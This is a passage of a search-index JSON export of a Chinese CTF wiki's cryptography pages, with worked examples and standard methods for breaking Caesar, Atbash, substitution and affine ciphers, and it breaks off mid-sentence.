\u4e16\u7eaa\u4e2d\u540e\u671f\u51fa\u73b0\u7684\u5927\u91cf\u76f8\u5173\u7406\u8bba\uff0c1949 \u5e74\u9999\u519c\uff08C. E. Shannon\uff09\u53d1\u8868\u4e86\u9898\u4e3a\u300a\u4fdd\u5bc6\u7cfb\u7edf\u7684\u901a\u4fe1\u7406\u8bba\u300b\u7684\u7ecf\u5178\u8bba\u6587\u6807\u5fd7\u7740\u73b0\u4ee3\u5bc6\u7801\u5b66\u7684\u5f00\u59cb\u3002\u73b0\u4ee3\u5bc6\u7801\u5b66\u4e3b\u8981\u5305\u542b\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\uff1a\n\n\n\n\n\u5bf9\u79f0\u52a0\u5bc6\uff08Symmetric Cryptography\uff09\uff0c\u4ee5 DES\uff0cAES\uff0cRC4 \u4e3a\u4ee3\u8868\u3002\n\n\n\u975e\u5bf9\u79f0\u52a0\u5bc6\uff08Asymmetric Cryptography\uff09\uff0c\u4ee5 RSA\uff0cElGamal\uff0c\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u4e3a\u4ee3\u8868\u3002\n\n\n\u54c8\u5e0c\u51fd\u6570\uff08Hash Function\uff09\uff0c\u4ee5 MD5\uff0cSHA-1\uff0cSHA-512 \u7b49\u4e3a\u4ee3\u8868\u3002\n\n\n\u6570\u5b57\u7b7e\u540d\uff08Digital Signature\uff09\uff0c\u4ee5 RSA \u7b7e\u540d\uff0cElGamal \u7b7e\u540d\uff0cDSA \u7b7e\u540d\u4e3a\u4ee3\u8868\u3002\n\n\n\n\n\u5176\u4e2d\uff0c\u5bf9\u79f0\u52a0\u5bc6\u4f53\u5236\u4e3b\u8981\u5206\u4e3a\u4e24\u79cd\u65b9\u5f0f\uff1a\n\n\n\n\n\u5206\u7ec4\u5bc6\u7801\uff08Block Cipher\uff09\uff0c\u53c8\u79f0\u4e3a\u5757\u5bc6\u7801\u3002\n\n\n\u5e8f\u5217\u5bc6\u7801\uff08Stream Cipher\uff09\uff0c\u53c8\u79f0\u4e3a\u6d41\u5bc6\u7801\u3002\n\n\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c\u5bc6\u7801\u8bbe\u8ba1\u8005\u7684\u6839\u672c\u76ee\u6807\u662f\u4fdd\u969c\u4fe1\u606f\u53ca\u4fe1\u606f\u7cfb\u7edf\u7684\n\n\n\n\n\u673a\u5bc6\u6027\uff08Confidentiality\uff09\n\n\n\u5b8c\u6574\u6027\uff08Integrity\uff09\n\n\n\u53ef\u7528\u6027\uff08Availability\uff09\n\n\n\u8ba4\u8bc1\u6027\uff08Authentication\uff09\n\n\n\u4e0d\u53ef\u5426\u8ba4\u6027\uff08Non-repudiation\uff09\n\n\n\n\n\u5176\u4e2d\uff0c\u524d\u4e09\u8005\u88ab\u79f0\u4e3a\u4fe1\u606f\u5b89\u5168\u7684 CIA \u4e09\u8981\u7d20 \u3002\n\n\n\u800c\u5bf9\u4e8e\u5bc6\u7801\u7834\u89e3\u8005\u6765\u8bf4\uff0c\u4e00\u822c\u662f\u8981\u60f3\u529e\u6cd5\u8bc6\u522b\u51fa\u5bc6\u7801\u7b97\u6cd5\uff0c\u7136\u540e\u8fdb\u884c\u66b4\u529b\u7834\u89e3\uff0c\u6216\u8005\u5229\u7528\u5bc6\u7801\u4f53\u5236\u7684\u6f0f\u6d1e\u8fdb\u884c\u7834\u89e3\u3002\u5f53\u7136\uff0c\u4e5f\u6709\u53ef\u80fd\u901a\u8fc7\u6784\u9020\u865a\u5047\u7684\u54c8\u5e0c\u503c\u6216\u8005\u6570\u5b57\u7b7e\u540d\u6765\u7ed5\u8fc7\u76f8\u5e94\u7684\u68c0\u6d4b\u3002\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u90fd\u4f1a\u5047\u8bbe\u653b\u51fb\u8005\u5df2\u77e5\u5f85\u7834\u89e3\u7684\u5bc6\u7801\u4f53\u5236\uff0c\u800c\u653b\u51fb\u7c7b\u578b\u901a\u5e38\u5206\u4e3a\u4ee5\u4e0b\u56db\u79cd\uff1a\n\n\n\n\n\n\n\n\n\u653b\u51fb\u7c7b\u578b\n\n\n\u8bf4\u660e\n\n\n\n\n\n\n\n\n\n\n\u552f\u5bc6\u6587\u653b\u51fb\n\n\n\u53ea\u62e5\u6709\u5bc6\u6587\n\n\n\n\n\n\n\u5df2\u77e5\u660e\u6587\u653b\u51fb\n\n\n\u62e5\u6709\u5bc6\u6587\u4e0e\u5bf9\u5e94\u7684\u660e\u6587\n\n\n\n\n\n\n\u9009\u62e9\u660e\u6587\u653b\u51fb\n\n\n\u62e5\u6709\u52a0\u5bc6\u6743\u9650\uff0c\u80fd\u591f\u5bf9\u660e\u6587\u52a0\u5bc6\u540e\u83b7\u5f97\u76f8\u5e94\u5bc6\u6587\n\n\n\n\n\n\n\u9009\u62e9\u5bc6\u6587\u653b\u51fb\n\n\n\u62e5\u6709\u89e3\u5bc6\u6743\u9650\uff0c\u80fd\u591f\u5bf9\u5bc6\u6587\u89e3\u5bc6\u540e\u83b7\u5f97\u76f8\u5e94\u660e\u6587\n\n\n\n\n\n\n\n\n\n\nNote\n\n\n\u6ce8\uff1a\u4e4b\u524d\u5728\u8fd9\u91cc\u66fe\u5199\u8fc7\u8fd9\u4e9b\u653b\u51fb\u5e38\u89c1\u7684\u573a\u666f\uff0c\u968f\u7740\u4e0d\u65ad\u5730\u5b66\u4e60\uff0c\u6e10\u6e10\u610f\u8bc6\u5230\u8fd9\u4e9b\u653b\u51fb\u7c7b\u578b\u4fa7\u91cd\u63cf\u8ff0\u653b\u51fb\u8005\u7684\u80fd\u529b\uff0c\u6709\u53ef\u80fd\u9002\u7528\u4e8e\u5404\u79cd\u5404\u6837\u7684\u573a\u666f\u3002\u6545\u8fdb\u884c\u4fee\u6b63\u3002\n\n\n\n\n\u8fd9\u91cc\u63a8\u8350\u4e00\u4e9b\u8d44\u6599\n\n\n\n\n\u53ef\u6c57\u5b66\u9662\u516c\u5f00\u8bfe\n\n\n\u6df1\u5165\u6d45\u51fa\u5bc6\u7801\u5b66\u2014\u2014\u5e38\u7528\u52a0\u5bc6\u6280\u672f\u539f\u7406\u4e0e\u5e94\u7528\n\n\n\n\n\n\nNote\n\n\n\u63a8\u8350\u5728\u770b\u5b8c\u516c\u5f00\u8bfe\u7684\u60c5\u51b5\u4e0b\uff0c\u4ee5\u53ca\u7b80\u5355\u770b\u770b\u7535\u5b50\u4e66\u7684\u60c5\u51b5\u4e0b\u5728\u8003\u8651\u662f\u5426\u8981\u8d2d\u4e70\u4e66\uff0c\u56e0\u4e3a\u4e66\u4e70\u56de\u6765\u4e00\u822c\u90fd\u88ab\u95f2\u7f6e\u8d77\u6765\u4e86\u3002\n\n\n\n\n\u53c2\u8003\n\n\n\n\n\u7ef4\u57fa\u767e\u79d1-\u5bc6\u7801\u5b66\n\n\n\n\n\n\nInfo\n\n\n\u672c\u8282\u5927\u90e8\u5206\u5b9a\u4e49\u4e0e\u4f8b\u5b50\u53c2\u8003\u4e86\u7ef4\u57fa\u767e\u79d1\u3002", 
            "title": "\u5bc6\u7801\u5b66\u7b80\u4ecb"
        }, 
        {
            "location": "/crypto/introduction/#_1", 
            "text": "\u7ef4\u57fa\u767e\u79d1-\u5bc6\u7801\u5b66    Info  \u672c\u8282\u5927\u90e8\u5206\u5b9a\u4e49\u4e0e\u4f8b\u5b50\u53c2\u8003\u4e86\u7ef4\u57fa\u767e\u79d1\u3002", 
            "title": "\u53c2\u8003"
        }, 
        {
            "location": "/crypto/classical/introduction/", 
            "text": "\u5728\u53e4\u5178\u5bc6\u7801\u5b66\u4e2d\uff0c\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd\u5355\u8868\u66ff\u4ee3\u5bc6\u7801\uff0c\u591a\u8868\u66ff\u4ee3\u5bc6\u7801\uff0c\u4ee5\u53ca\u4e00\u4e9b\u5176\u5b83\u6bd4\u8f83\u6709\u610f\u601d\u7684\u5bc6\u7801\u3002\n\n\n\u503c\u5f97\u4e00\u63d0\u7684\u662f\uff0c\u5728\u53e4\u5178\u5bc6\u7801\u5b66\u4e2d\uff0c\u8bbe\u8ba1\u8005\u4e3b\u8981\u8003\u8651\u6d88\u606f\u7684\u4fdd\u5bc6\u6027\uff0c\u4f7f\u5f97\u53ea\u6709\u76f8\u5173\u5bc6\u94a5\u7684\u4eba\u624d\u53ef\u4ee5\u89e3\u5bc6\u5bc6\u6587\u83b7\u5f97\u6d88\u606f\u7684\u5185\u5bb9\uff0c\u5bf9\u4e8e\u6d88\u606f\u7684\u5b8c\u6574\u6027\u548c\u4e0d\u53ef\u5426\u8ba4\u6027\u5219\u5e76\u6ca1\u6709\u8fdb\u884c\u592a\u591a\u7684\u8003\u8651\u3002\n\n\n\n\n\n\n\u62d3\u5c55\u9605\u8bfb\n\n\n\n\nCTF \u4e2d\u90a3\u4e9b\u8111\u6d1e\u5927\u5f00\u7684\u7f16\u7801\u548c\u52a0\u5bc6\n\n\n\u3010\u5bc6\u7801\u6559\u7a0b\u3011\u5404\u79cd\u52a0\u5bc6\u65b9\u5f0f\u8be6\u89e3\uff0c\u767e\u5ea6\u8d34\u5427", 
            "title": "\u53e4\u5178\u5bc6\u7801\u7b80\u4ecb"
        }, 
        {
            "location": "/crypto/classical/monoalphabetic/", 
            "text": "\u901a\u7528\u7279\u70b9\n\n\n\u5728\u5355\u8868\u66ff\u6362\u52a0\u5bc6\u4e2d\uff0c\u6240\u6709\u7684\u52a0\u5bc6\u65b9\u5f0f\u51e0\u4e4e\u90fd\u6709\u4e00\u4e2a\u5171\u6027\uff0c\u90a3\u5c31\u662f\u660e\u5bc6\u6587\u4e00\u4e00\u5bf9\u5e94\u3002\u6240\u4ee5\u8bf4\uff0c\u4e00\u822c\u6709\u4ee5\u4e0b\u4e24\u79cd\u65b9\u5f0f\u6765\u8fdb\u884c\u7834\u89e3\n\n\n\n\n\u5728\u5bc6\u94a5\u7a7a\u95f4\u8f83\u5c0f\u7684\u60c5\u51b5\u4e0b\uff0c\u91c7\u7528\u66b4\u529b\u7834\u89e3\u65b9\u5f0f\n\n\n\u5728\u5bc6\u6587\u957f\u5ea6\u8db3\u591f\u957f\u7684\u65f6\u5019\uff0c\u4f7f\u7528\u8bcd\u9891\u5206\u6790\uff0c\nhttp://quipqiup.com/\n\n\n\n\n\u5f53\u5bc6\u94a5\u7a7a\u95f4\u8db3\u591f\u5927\uff0c\u800c\u5bc6\u6587\u957f\u5ea6\u8db3\u591f\u77ed\u7684\u60c5\u51b5\u4e0b\uff0c\u7834\u89e3\u8f83\u4e3a\u56f0\u96be\u3002\n\n\n\u51ef\u6492\u5bc6\u7801\n\n\n\u539f\u7406\n\n\n\u51ef\u6492\u5bc6\u7801\uff08Caesar\uff09\u52a0\u5bc6\u65f6\u4f1a\u5c06\u660e\u6587\u4e2d\u7684 \n\u6bcf\u4e2a\u5b57\u6bcd\n \u90fd\u6309\u7167\u5176\u5728\u5b57\u6bcd\u8868\u4e2d\u7684\u987a\u5e8f\u5411\u540e\uff08\u6216\u5411\u524d\uff09\u79fb\u52a8\u56fa\u5b9a\u6570\u76ee\uff08\n\u5faa\u73af\u79fb\u52a8\n\uff09\u4f5c\u4e3a\u5bc6\u6587\u3002\u4f8b\u5982\uff0c\u5f53\u504f\u79fb\u91cf\u662f\u5de6\u79fb 3 \u7684\u65f6\u5019\uff08\u89e3\u5bc6\u65f6\u7684\u5bc6\u94a5\u5c31\u662f 3\uff09\uff1a\n\n\n\u660e\u6587\u5b57\u6bcd\u8868\uff1aABCDEFGHIJKLMNOPQRSTUVWXYZ\n\u5bc6\u6587\u5b57\u6bcd\u8868\uff1aDEFGHIJKLMNOPQRSTUVWXYZABC\n\n\n\n\n\u4f7f\u7528\u65f6\uff0c\u52a0\u5bc6\u8005\u67e5\u627e\u660e\u6587\u5b57\u6bcd\u8868\u4e2d\u9700\u8981\u52a0\u5bc6\u7684\u6d88\u606f\u4e2d\u7684\u6bcf\u4e00\u4e2a\u5b57\u6bcd\u6240\u5728\u4f4d\u7f6e\uff0c\u5e76\u4e14\u5199\u4e0b\u5bc6\u6587\u5b57\u6bcd\u8868\u4e2d\u5bf9\u5e94\u7684\u5b57\u6bcd\u3002\u9700\u8981\u89e3\u5bc6\u7684\u4eba\u5219\u6839\u636e\u4e8b\u5148\u5df2\u77e5\u7684\u5bc6\u94a5\u53cd\u8fc7\u6765\u64cd\u4f5c\uff0c\u5f97\u5230\u539f\u6765\u7684\u660e\u6587\u3002\u4f8b\u5982\uff1a\n\n\n\u660e\u6587\uff1aTHE QUICK BROWN FOX JUMPS OVER THE LAZY DOG\n\u5bc6\u6587\uff1aWKH TXLFN EURZQ IRA MXPSV RYHU WKH ODCB GRJ\n\n\n\n\n\u6839\u636e\u504f\u79fb\u91cf\u7684\u4e0d\u540c\uff0c\u8fd8\u5b58\u5728\n\u82e5\u5e72\u7279\u5b9a\u7684\u607a\u6492\u5bc6\u7801\u540d\u79f0\n\uff1a\n\n\n\n\n\u504f\u79fb\u91cf\u4e3a 10\uff1aAvocat \uff08A\u2192K\uff09\n\n\n\u504f\u79fb\u91cf\u4e3a 13\uff1a\nROT13\n\n\n\u504f\u79fb\u91cf\u4e3a -5\uff1aCassis \uff08K 6\uff09\n\n\n\u504f\u79fb\u91cf\u4e3a -6\uff1aCassette \uff08K 7\uff09\n\n\n\n\n\u6b64\u5916\uff0c\u8fd8\u6709\u8fd8\u6709\u4e00\u79cd\u57fa\u4e8e\u5bc6\u94a5\u7684\u51ef\u6492\u5bc6\u7801 Keyed Caesar\u3002\u5176\u57fa\u672c\u539f\u7406\u662f \n\u5229\u7528\u4e00\u4e2a\u5bc6\u94a5\uff0c\u5c06\u5bc6\u94a5\u7684\u6bcf\u4e00\u4f4d\u8f6c\u6362\u4e3a\u6570\u5b57\uff08\u4e00\u822c\u8f6c\u5316\u4e3a\u5b57\u6bcd\u8868\u5bf9\u5e94\u987a\u5e8f\u7684\u6570\u5b57\uff09\uff0c\u5206\u522b\u4ee5\u8fd9\u4e00\u6570\u5b57\u4e3a\u5bc6\u94a5\u52a0\u5bc6\u660e\u6587\u7684\u6bcf\u4e00\u4f4d\u5b57\u6bcd\u3002\n\n\n\u8fd9\u91cc\u4ee5 \nXMan \u4e00\u671f\u590f\u4ee4\u8425\u5206\u4eab\u8d5b\u5bab\u4fdd\u9e21\u4e01\u961f Crypto 100\n \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\n\n\n\u660e\u6587\uff1as0a6u3u1s0bv1a\n\u5bc6\u94a5\uff1aguangtou\n\u504f\u79fb\uff1a6,20,0,13,6,19,14,20\n\u5bc6\u6587\uff1ay0u6u3h1y0uj1u\n\n\n\n\n\u7834\u89e3\n\n\n\u5bf9\u4e8e\u4e0d\u5e26\u5bc6\u94a5\u7684\u51ef\u6492\u5bc6\u7801\u6765\u8bf4\uff0c\u5176\u57fa\u672c\u7684\u7834\u89e3\u65b9\u6cd5\u6709\u4e24\u79cd\u65b9\u5f0f\n\n\n\n\n\u904d\u5386 26 \u4e2a\u504f\u79fb\u91cf\uff0c\u9002\u7528\u4e8e\u666e\u904d\u60c5\u51b5\n\n\n\u5229\u7528\u8bcd\u9891\u5206\u6790\uff0c\u9002\u7528\u4e8e\u5bc6\u6587\u8f83\u957f\u7684\u60c5\u51b5\u3002\n\n\n\n\n\u5176\u4e2d\uff0c\u7b2c\u4e00\u79cd\u65b9\u5f0f\u80af\u5b9a\u53ef\u4ee5\u5f97\u5230\u660e\u6587\uff0c\u800c\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u5219\u4e0d\u4e00\u5b9a\u53ef\u4ee5\u5f97\u5230\u6b63\u786e\u7684\u660e\u6587\u3002\n\n\n\u800c\u5bf9\u4e8e\u57fa\u4e8e\u5bc6\u94a5\u7684\u51ef\u6492\u5bc6\u7801\u6765\u8bf4\uff0c\u4e00\u822c\u6765\u8bf4\u5fc5\u987b\u77e5\u9053\u5bf9\u5e94\u7684\u5bc6\u94a5\u3002\n\n\n\u5de5\u5177\n\n\n\u4e00\u822c\u6211\u4eec\u6709\u5982\u4e0b\u7684\u5de5\u5177\uff0c\u5176\u4e2dJPK\u6bd4\u8f83\u901a\u7528\u3002\n\n\n\n\nJPK\uff0c\u53ef\u89e3\u5e26\u5bc6\u94a5\u4e0e\u4e0d\u5e26\u5bc6\u94a5\n\n\nhttp://planetcalc.com/1434/\n\n\nhttp://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php\n\n\n\n\n\u79fb\u4f4d\u5bc6\u7801\n\n\n\u4e0e\u51ef\u6492\u5bc6\u7801\u7c7b\u4f3c\uff0c\u533a\u522b\u5728\u4e8e\u79fb\u4f4d\u5bc6\u7801\u4e0d\u4ec5\u4f1a\u5904\u7406\u5b57\u6bcd\uff0c\u8fd8\u4f1a\u5904\u7406\u6570\u5b57\u548c\u7279\u6b8a\u5b57\u7b26\uff0c\u5e38\u7528 ASCII \u7801\u8868\u8fdb\u884c\u79fb\u4f4d\u3002\u5176\u7834\u89e3\u65b9\u6cd5\u4e5f\u662f\u904d\u5386\u6240\u6709\u7684\u53ef\u80fd\u6027\u6765\u5f97\u5230\u53ef\u80fd\u7684\u7ed3\u679c\u3002\n\n\nAtbash Cipher\n\n\n\u539f\u7406\n\n\n\u57c3\u7279\u5df4\u4ec0\u7801\uff08Atbash Cipher\uff09\u5176\u5b9e\u53ef\u4ee5\u89c6\u4e3a\u4e0b\u9762\u8981\u4ecb\u7ecd\u7684\u7b80\u5355\u66ff\u6362\u5bc6\u7801\u7684\u7279\u4f8b\uff0c\u5b83\u4f7f\u7528\u5b57\u6bcd\u8868\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u6bcd\u4ee3\u8868\u7b2c\u4e00\u4e2a\u5b57\u6bcd\uff0c\u5012\u6570\u7b2c\u4e8c\u4e2a\u5b57\u6bcd\u4ee3\u8868\u7b2c\u4e8c\u4e2a\u5b57\u6bcd\u3002\u5728\u7f57\u9a6c\u5b57\u6bcd\u8868\u4e2d\uff0c\u5b83\u662f\u8fd9\u6837\u51fa\u73b0\u7684\uff1a\n\n\n\u660e\u6587\uff1aA B C D E F G H I J K L M N O P Q R S T U V W X Y Z\n\u5bc6\u6587\uff1aZ Y X W V U T S R Q P O N M L K J I H G F E D C B A\n\n\n\n\n\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\uff1a\n\n\n\u660e\u6587\uff1athe quick brown fox jumps over the lazy dog\n\u5bc6\u6587\uff1agsv jfrxp yildm ulc qfnkh levi gsv ozab wlt\n\n\n\n\n\u7834\u89e3\n\n\n\u53ef\u4ee5\u770b\u51fa\u5176\u5bc6\u94a5\u7a7a\u95f4\u8db3\u591f\u77ed\uff0c\u540c\u65f6\u5f53\u5bc6\u6587\u8db3\u591f\u957f\u65f6\uff0c\u4ecd\u7136\u53ef\u4ee5\u91c7\u7528\u8bcd\u9891\u5206\u6790\u7684\u65b9\u6cd5\u89e3\u51b3\u3002\n\n\n\u5de5\u5177\n\n\n\n\nhttp://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/\n\n\n\n\n\u7b80\u5355\u66ff\u6362\u5bc6\u7801\n\n\n\u539f\u7406\n\n\n\u7b80\u5355\u66ff\u6362\u5bc6\u7801\uff08Simple Substitution Cipher\uff09\u52a0\u5bc6\u65f6\uff0c\u5c06\u6bcf\u4e2a\u660e\u6587\u5b57\u6bcd\u66ff\u6362\u4e3a\u4e0e\u4e4b\u552f\u4e00\u5bf9\u5e94\u4e14\u4e0d\u540c\u7684\u5b57\u6bcd\u3002\u5b83\u4e0e\u607a\u6492\u5bc6\u7801\u4e4b\u95f4\u7684\u533a\u522b\u662f\u5176\u5bc6\u7801\u5b57\u6bcd\u8868\u7684\u5b57\u6bcd\u4e0d\u662f\u7b80\u5355\u7684\u79fb\u4f4d\uff0c\u800c\u662f\u5b8c\u5168\u662f\u6df7\u4e71\u7684\uff0c\u8fd9\u4e5f\u4f7f\u5f97\u5176\u7834\u89e3\u96be\u5ea6\u8981\u9ad8\u4e8e\u51ef\u6492\u5bc6\u7801\u3002 \u6bd4\u5982\uff1a\n\n\n\u660e\u6587\u5b57\u6bcd : abcdefghijklmnopqrstuvwxyz\n\u5bc6\u94a5\u5b57\u6bcd : phqgiumeaylnofdxjkrcvstzwb\n\n\n\n\na \u5bf9\u5e94 p\uff0cd \u5bf9\u5e94 h\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002\n\n\n\u660e\u6587\uff1athe quick brown fox jumps over the lazy dog\n\u5bc6\u6587\uff1acei jvaql hkdtf udz yvoxr dsik cei npbw gdm\n\n\n\n\n\u800c\u89e3\u5bc6\u65f6\uff0c\u6211\u4eec\u4e00\u822c\u662f\u77e5\u9053\u4e86\u6bcf\u4e00\u4e2a\u5b57\u6bcd\u7684\u5bf9\u5e94\u89c4\u5219\uff0c\u624d\u53ef\u4ee5\u6b63\u5e38\u89e3\u5bc6\u3002\n\n\n\u7834\u89e3\n\n\n\u7531\u4e8e\u8fd9\u79cd\u52a0\u5bc6\u65b9\u5f0f\u5bfc\u81f4\u5176\u6240\u6709\u7684\u5bc6\u94a5\u4e2a\u6570\u662f\n26!\n26!\n \uff0c\u6240\u4ee5\u51e0\u4e4e\u4e0a\u4e0d\u53ef\u80fd\u4f7f\u7528\u66b4\u529b\u7684\u89e3\u51b3\u65b9\u5f0f\u3002\u6240\u4ee5\u6211\u4eec \u4e00\u822c\u91c7\u7528\u8bcd\u9891\u5206\u6790\u3002\n\n\n\u5de5\u5177\n\n\n\n\nhttp://quipqiup.com/\n\n\n\n\n\u4eff\u5c04\u5bc6\u7801\n\n\n\u539f\u7406\n\n\n\u4eff\u5c04\u5bc6\u7801\u7684\u52a0\u5bc6\u51fd\u6570\u662f \nE(x)=(ax+b)\\pmod m\nE(x)=(ax+b)\\pmod m\n\uff0c\u5176\u4e2d\n\n\n\n\nx\nx\n \u8868\u793a\u660e\u6587\u6309\u7167\u67d0\u79cd\u7f16\u7801\u5f97\u5230\u7684\u6570\u5b57\n\n\na\na\n \u548c \nm\nm\n \u4e92\u8d28\n\n\nm\nm\n \u662f\u7f16\u7801\u7cfb\u7edf\u4e2d\u5b57\u6bcd\u7684\u6570\u76ee\u3002\n\n\n\n\n\u89e3\u5bc6\u51fd\u6570\u662f \nD(x)=a^{-1}(x-b)\\pmod m\nD(x)=a^{-1}(x-b)\\pmod m\n\uff0c\u5176\u4e2d \na^{-1}\na^{-1}\n \u662f \na\na\n \u5728 \n\\mathbb{Z}_{m}\n\\mathbb{Z}_{m}\n \u7fa4\u7684\u4e58\u6cd5\u9006\u5143\u3002\n\n\n\u4e0b\u9762\u6211\u4eec\u4ee5 \nE(x) = (5x + 8) \\bmod 26\nE(x) = (5x + 8) \\bmod 26\n \u51fd\u6570\u4e3a\u4f8b\u5b50\u8fdb\u884c\u4ecb\u7ecd\uff0c\u52a0\u5bc6\u5b57\u7b26\u4e32\u4e3a \nAFFINE CIPHER\n\uff0c\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u91c7\u7528\u5b57\u6bcd\u886826\u4e2a\u5b57\u6bcd\u4f5c\u4e3a\u7f16\u7801\u7cfb\u7edf\n\n\n\n\n\n\n\n\n\u660e\u6587\n\n\nA\n\n\nF\n\n\nF\n\n\nI\n\n\nN\n\n\nE\n\n\nC\n\n\nI\n\n\nP\n\n\nH\n\n\nE\n\n\nR\n\n\n\n\n\n\n\n\n\n\nx\n\n\n0\n\n\n5\n\n\n5\n\n\n8\n\n\n13\n\n\n4\n\n\n2\n\n\n8\n\n\n15\n\n\n7\n\n\n4\n\n\n17\n\n\n\n\n\n\ny=5x+8\ny=5x+8\n\n\n8\n\n\n33\n\n\n33\n\n\n48\n\n\n73\n\n\n28\n\n\n18\n\n\n48\n\n\n83\n\n\n43\n\n\n28\n\n\n93\n\n\n\n\n\n\ny\\mod26\ny\\mod26\n\n\n8\n\n\n7\n\n\n7\n\n\n22\n\n\n21\n\n\n2\n\n\n18\n\n\n22\n\n\n5\n\n\n17\n\n\n2\n\n\n15\n\n\n\n\n\n\n\u5bc6\u6587\n\n\nI\n\n\nH\n\n\nH\n\n\nW\n\n\nV\n\n\nC\n\n\nS\n\n\nW\n\n\nF\n\n\nR\n\n\nC\n\n\nP\n\n\n\n\n\n\n\n\n\u5176\u5bf9\u5e94\u7684\u52a0\u5bc6\u7ed3\u679c\u662f \nIHHWVCSWFRCP\n\u3002\n\n\n\u5bf9\u4e8e\u89e3\u5bc6\u8fc7\u7a0b\uff0c\u6b63\u5e38\u89e3\u5bc6\u8005\u5177\u6709a\u4e0eb\uff0c\u53ef\u4ee5\u8ba1\u7b97\u5f97\u5230 \na^{-1}\na^{-1}\n \u4e3a 21\uff0c\u6240\u4ee5\u5176\u89e3\u5bc6\u51fd\u6570\u662f\nD(x)=21(x-8)\\pmod {26}\nD(x)=21(x-8)\\pmod {26}\n \uff0c\u89e3\u5bc6\u5982\u4e0b\n\n\n\n\n\n\n\n\n\u5bc6\u6587\n\n\nI\n\n\nH\n\n\nH\n\n\nW\n\n\nV\n\n\nC\n\n\nS\n\n\nW\n\n\nF\n\n\nR\n\n\nC\n\n\nP\n\n\n\n\n\n\n\n\n\n\ny\ny\n\n\n8\n\n\n7\n\n\n7\n\n\n22\n\n\n21\n\n\n2\n\n\n18\n\n\n22\n\n\n5\n\n\n17\n\n\n2\n\n\n15\n\n\n\n\n\n\nx=21(y-8)\nx=21(y-8)\n\n\n0\n\n\n-21\n\n\n-21\n\n\n294\n\n\n273\n\n\n-126\n\n\n210\n\n\n294\n\n\n-63\n\n\n189\n\n\n-126\n\n\n147\n\n\n\n\n\n\nx\\mod26\nx\\mod26\n\n\n0\n\n\n5\n\n\n5\n\n\n8\n\n\n13\n\n\n4\n\n\n2\n\n\n8\n\n\n15\n\n\n7\n\n\n4\n\n\n17\n\n\n\n\n\n\n\u660e\u6587\n\n\nA\n\n\nF\n\n\nF\n\n\nI\n\n\nN\n\n\nE\n\n\nC\n\n\nI\n\n\nP\n\n\nH\n\n\nE\n\n\nR\n\n\n\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u5176\u7279\u70b9\u5728\u4e8e\u53ea\u6709 26 \u4e2a\u82f1\u6587\u5b57\u6bcd\u3002\n\n\n\u7834\u89e3\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7684\u662f\uff0c\u4eff\u5c04\u5bc6\u7801\u5bf9\u4e8e\u4efb\u610f\u4e24\u4e2a\u4e0d\u540c\u7684\u5b57\u6bcd\uff0c\u5176\u6700\u540e\u5f97\u5230\u7684\u5bc6\u6587\u5fc5\u7136\u4e0d\u4e00\u6837\uff0c\u6240\u4ee5\u5176\u4e5f\u5177\u6709\u6700\u901a\u7528\u7684\u7279\u70b9\u3002\u5f53\u5bc6\u6587\u957f\u5ea6\u8db3\u591f\u957f\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u9891\u7387\u5206\u6790\u7684\u65b9\u6cd5\u6765\u89e3\u51b3\u3002\n\n\n\u5176\u6b21\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u5982\u4f55\u653b\u51fb\u8be5\u5bc6\u7801\u3002\u53ef\u4ee5\u770b\u51fa\u5f53\na=1\na=1\n \u65f6\uff0c\u4eff\u5c04\u52a0\u5bc6\u662f\u51ef\u6492\u52a0\u5bc6\u3002\u800c\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u5229\u7528\u4eff\u5c04\u5bc6\u7801\u65f6\uff0c\u5176\u5b57\u7b26\u96c6\u90fd\u7528\u7684\u662f\u5b57\u6bcd\u8868\uff0c\u4e00\u822c\u53ea\u670926\u4e2a\u5b57\u6bcd\uff0c\u800c\u4e0d\u5927\u4e8e26\u7684\u4e0e26\u4e92\u7d20\u7684\u4e2a\u6570\u4e00\u5171\u6709 \n\n\n\n\n\n\\phi(26)=\\phi(2) \\times \\phi(13) = 12\n\n\n\n\n\\phi(26)=\\phi(2) \\times \\phi(13) = 12\n\n\n\n\n\n\u7b97\u4e0ab\u7684\u504f\u79fb\u53ef\u80fd\uff0c\u4e00\u5171\u6709\u53ef\u80fd\u7684\u5bc6\u94a5\u7a7a\u95f4\u5927\u5c0f\u4e5f\u5c31\u662f \n\n\n\n\n\n12 \\times 26 = 312\n\n\n\n\n12 \\times 26 = 312\n\n\n\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c\u5bf9\u4e8e\u8be5\u79cd\u5bc6\u7801\uff0c\u6211\u4eec\u81f3\u5c11\u5f97\u662f\u5728\u5df2\u77e5\u90e8\u5206\u660e\u6587\u7684\u60c5\u51b5\u4e0b\u624d\u53ef\u4ee5\u653b\u51fb\u3002\u4e0b\u9762\u8fdb\u884c\u7b80\u5355\u7684\u5206\u6790\u3002\n\n\n\u8fd9\u79cd\u5bc6\u7801\u7531\u4e24\u79cd\u53c2\u6570\u6765\u63a7\u5236\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u5176\u4e2d\u4efb\u610f\u4e00\u4e2a\u53c2\u6570\uff0c\u90a3\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u5feb\u901f\u679a\u4e3e\u53e6\u5916\u4e00\u4e2a\u53c2\u6570\u5f97\u5230\u7b54\u6848\u3002\n\n\n\u4f46\u662f\uff0c\u5047\u8bbe\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u91c7\u7528\u7684\u5b57\u6bcd\u96c6\uff0c\u8fd9\u91cc\u5047\u8bbe\u4e3a26\u4e2a\